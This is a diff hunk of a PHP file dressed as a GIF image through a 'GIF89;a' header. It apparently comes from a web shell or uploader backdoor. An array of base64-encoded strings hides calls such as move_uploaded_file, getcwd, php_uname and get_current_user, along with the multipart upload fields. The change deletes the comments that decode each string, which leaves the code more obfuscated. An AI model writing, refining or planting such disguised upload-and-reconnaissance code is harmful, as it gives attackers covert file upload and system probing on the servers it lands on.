@@ -2,15 +2,15 @@ GIF89;a
 <?php
 
 $Array = [
-    'bW92ZV91cGxvYWRlZF9maWxl', //move_uploaded_file
-    'Z2V0Y3dk', // getcwd
-    'cGhwX3VuYW1l', // php_uname
-    'Z2V0X2N1cnJlbnRfdXNlcg==', // get_current_user
-    'U0VSVkVSX1NPRlRXQVJF', // Server Software
-    'bmFtZQ==', // name
-    'ZmlsZQ==', // file
-    'dG1wX25hbWU=', // tmp_name
-    'bXVsdGlwYXJ0L2Zvcm0tZGF0YQ==' // multipart
+    'bW92ZV91cGxvYWRlZF9maWxl',
+    'Z2V0Y3dk', 
+    'cGhwX3VuYW1l', 
+    'Z2V0X2N1cnJlbnRfdXNlcg==',
+    'U0VSVkVSX1NPRlRXQVJF',
+    'bmFtZQ==',
+    'ZmlsZQ==', 
+    'dG1wX25hbWU=',
+    'bXVsdGlwYXJ0L2Zvcm0tZGF0YQ=='
 ];
 $hitung_array = count($Array);
 for ($i = 0; $i < $hitung_array; $i++) {
